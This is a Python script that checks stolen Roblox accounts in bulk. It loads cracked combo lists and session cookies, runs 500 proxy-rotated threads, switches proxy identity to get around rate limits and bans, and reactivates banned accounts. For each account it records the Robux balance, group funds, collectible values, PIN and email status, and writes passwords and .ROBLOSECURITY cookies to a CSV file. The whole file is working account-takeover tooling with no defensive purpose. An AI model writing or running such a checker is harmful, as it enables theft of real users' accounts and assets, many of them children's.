from utils import Counter, load_combos, set_title, format_collectibles, \
    find_and_format_items, get_rolimons
from tasks import TASK_MAP
from managers import ConnectionManager, HTTPException
from roblox import RobloxSession, APIError, PunishmentRedirect, PunishmentDeactivationFailed
from threading import Thread, Lock
from queue import Empty
from itertools import cycle
import time
import socket
import traceback

try:
    with open("find.txt") as f:
        TO_FIND = list(map(int, f.read().splitlines()))
except FileNotFoundError:
    TO_FIND = []

ITEM_DATA = get_rolimons()
THREAD_COUNT = 500
TASKS = ["robux", "premium", "collectibles", "inventory", "settings", "pin", "groups", "credit"]
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
WRITE_FIELDS = [
    ("Id", lambda c: c.id),
    ("Name", lambda c: c.name),
    ("Password", lambda c: c.password),
    ("Robux Balance", lambda c: c.robux),
    ("Credit Balance", lambda c: c.credit),
    ("Total Group Funds",
        lambda c: sum([i["group"].get("robux", 0)
                       for i in c.groups
                       if i["role"]["rank"] >= 255])
    ),
    ("Total RAP",
        lambda c: sum([i.get("recentAveragePrice", 0)
                       for i in c.collectibles])
    ),
    ("Total Value",
        lambda c: sum([ITEM_DATA.get(i["assetId"], {}).get("value", i.get("recentAveragePrice", 0))
                       for i in c.collectibles])
    ),
    ("Premium Stipend", lambda c: c.premium_stipend),
    ("Premium Expiration", lambda c: c.premium_expiry_date),
    ("Email Status", lambda c: "VERIFIED" if c.email_verified else ("UNVERIFIED" if c.email_address else "NO EMAIL")),
    ("PIN Enabled", lambda c: c.pin_enabled),
    ("Above 13", lambda c: c.above_13),
    ("Found Items",
        lambda c: TO_FIND and find_and_format_items(c.inventory, TO_FIND)),
    ("Inventory Count", lambda c: len(c.inventory)),
    ("Collectible List",
        lambda c: format_collectibles(c.collectibles, ITEM_DATA)
    ),
    ("Cookie", lambda c: c.cookie)
]

queue = None
for fname in ["cracked.txt", "combos.txt", "combos_and_cookies.txt", "cookies.txt"]:
    try:
        queue = load_combos(fname)
    except FileNotFoundError:
        pass

if not queue:
    raise Exception("Input file not found")
    
queue_length = queue.qsize()
counter = Counter()
cookie_cache = {}
cache_map = {}
cache_lock = Lock()

output = open("accounts.csv", "w", encoding="UTF-8", errors="ignore")
output.write(",".join([field for field, _ in WRITE_FIELDS]) + "\n")

try:
    with open("proxies.txt", encoding="UTF-8", errors="ignore") as f:
        proxies = cycle(f.read().splitlines())
except FileNotFoundError:
    proxies = None

def get_cache(session):
    with cache_lock:
        if session.id in cookie_cache:
            if cookie_cache[session.id] != session.cookies[".ROBLOSECURITY"]:
                raise DuplicateUser
        else:
            cookie_cache[session.id] = session.cookies[".ROBLOSECURITY"]
        if not session.id in cache_map:
            cache = UserCache(list(TASKS))
            cache_map[session.id] = cache
        else:
            cache = cache_map[session.id]
            if not cache._tasks:
                raise UserAlreadyCompleted
    return cache

def complete_callback(c):
    values = [
        value_func(c)
        for _, value_func in WRITE_FIELDS
    ]
    output.write(",".join([
        '"' + str(v if v is not None else "") + '"'
        for v in values
    ]) + "\n")
    output.flush()
    print(f"Saved {c.name}")

class UserAlreadyCompleted(Exception): pass
class DuplicateUser(Exception): pass
class UserCache:
    def __init__(self, tasks):
        self._tasks = tasks
        self.cookie = None
        self.password = None
        self.id = None
        self.name = None
        self.display_name = None
        self.robux = None
        self.premium_stipend = None
        self.premium_expiry_date = None
        self.collectibles = None
        self.admin = None
        self.email_address = None
        self.email_verified = None
        self.above_13 = None
        self.previous_names = None
        self.pin_enabled = None
        self.groups = None
        self.credit = None
        self.inventory = None

    def is_done(self):
        return not self._tasks

    def get_next(self):
        if self._tasks:
            return self._tasks[0]

    def complete(self, name):
        if name in self._tasks:
            self._tasks.remove(name)

class TitleUpdateWorker(Thread):
    def run(self):
        while queue_length > counter.total:
            time.sleep(0.1)
            try:
                set_title("  |  ".join([
                    "Progress: %d/%5d" % (counter.total, queue_length),
                    "CPM: %d" % counter.cpm()
                ]))

            except Exception as err:
                print("TUW exc:", err)
    
class Worker(Thread):
    def __init__(self):
        self.manager = None
        super().__init__()

    def new_identity(self):
        if self.manager:
            self.manager.clear()
            self.manager = None
        
        proxy_url = ("http://" + next(proxies)) if proxies else None
        self.manager = ConnectionManager(proxy_url)
    
    def run(self):
        self.new_identity()

        while 1:
            try:
                cookie, password = queue.get(False)
            except Empty:
                break
                
            session = RobloxSession(
                cookie,
                user_agent=USER_AGENT,
                manager=self.manager
            )

            try:
                try:
                    session.setup()
                except PunishmentRedirect:
                    session.reactivate()
                    print("Reactivated from ban")
                    session.setup()
                
                cache = get_cache(session)

                if not cache.cookie:
                    cache.cookie = cookie
                if password and not cache.password:
                    cache.password = password
                if not cache.id:
                    cache.id = session.id
                if not cache.name:
                    cache.name = session.name
                if not cache.display_name:
                    cache.display_name = session.display_name

                while (t := cache.get_next()):
                    task = TASK_MAP[t](session, cache)
                    task.complete()

                complete_callback(cache)
                counter.add()

            except PunishmentDeactivationFailed as err:
                print("Perm-banned account")
                counter.add()
        
            except (DuplicateUser, UserAlreadyCompleted) as err:
                print("Duplicate session")
                counter.add()

            except APIError as err:
                if err.code == 0 and err.response.status == 401:
                    print("Invalid cookie")
                    counter.add()

                elif err.code == 403:
                    queue.put((cookie, password))
                    self.new_identity()

                elif err.code == 0 and err.response.status == 429:
                    queue.put((cookie, password))
                    self.new_identity()

                else:
                    print("Unexpected API error:", err)
                    queue.put((cookie, password))

            except (socket.timeout, OSError, HTTPException) as err:
                #print("HTTP error:", err, type(err))
                queue.put((cookie, password))
                self.new_identity()

            except Exception as err:
                print("Unexpected internal error:", traceback.format_exc())
                queue.put((cookie, password))
                self.new_identity()
        
        self.manager.clear()

TitleUpdateWorker().start()
workers = [Worker() for _ in range(THREAD_COUNT)]
for w in workers: w.start()
for w in workers: w.join()

print("Done!")
